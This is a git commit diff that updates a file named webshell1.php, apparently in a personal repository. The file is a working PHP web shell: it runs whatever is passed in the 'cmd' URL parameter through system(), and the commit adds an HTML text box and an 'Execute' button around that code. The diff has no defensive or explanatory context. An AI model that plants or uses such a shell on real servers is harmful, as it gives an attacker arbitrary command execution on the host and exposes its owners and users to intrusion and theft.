01c092f2316c443bd9fcdce002b2319eafd428c3
ohjun1998 <70497649+ohjun1998@users.noreply.github.com>
2023-09-21 02:49:31 +0900

    Update webshell1.php

--- webshell1.php
+++ webshell1.php
@@ -1,4 +1,13 @@
+<html>
+<body>
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
 <?
     $cmd = $_GET["cmd"];
     system($cmd);
 ?>
+</pre>
+</body>
+</html>
